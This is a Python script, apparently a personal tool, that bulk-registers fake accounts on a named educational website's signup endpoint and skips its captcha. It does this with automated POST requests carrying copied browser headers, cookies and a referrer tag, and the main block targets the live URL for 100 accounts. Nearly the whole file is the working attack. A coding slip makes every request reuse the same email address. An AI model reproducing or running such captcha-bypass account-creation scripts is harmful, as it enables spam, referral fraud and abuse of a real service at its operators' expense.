import requests
import json
#fix your shit aram

class CaptchaExploit:
    def __init__(self):
        self.url = ""
    
    def set_url(self,url): 
        self.url = url

    def set_name(self,name):
        self.name = name

    def set_num_accounts(self,num):
        self.num = num

    def craft_exploit(self):

        self.data = {"fnm":"firstName","lnm":"lastName","grd":"12","shl":"school","eml":"{0}".format(self.name + str(self.num)),"pwd":"password1","dte":"08/14/2017","isSum":False,"referrer":"aram"}
          
        #this was make-shift, so it uses my own browser information
        #I suppose I could shorten this somehow, but at the moment
        #I can't be bothered
        self.headers = { "Host": "www.scicademy.org", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Referer": "http://www.scicademy.org/","Content-Length": "{0}".format(str(len(str(self.data).replace(" ","")))), "Cookie": "_ga=GA1.2.804063011.1502758976; _gid=GA1.2.987408565.1502758976; _gat=1", "Connection": "close"}

    def send_payload(self):
        for i in range(self.num):
            self.craft_exploit()
            requests.post(self.url,data = json.dumps(self.data),headers = self.headers)

if __name__ == "__main__":
    c = CaptchaExploit()
    c.set_url("http://www.scicademy.org/addUser")
    c.set_name("kappa")
    c.set_num_accounts(100)  
    c.send_payload() 
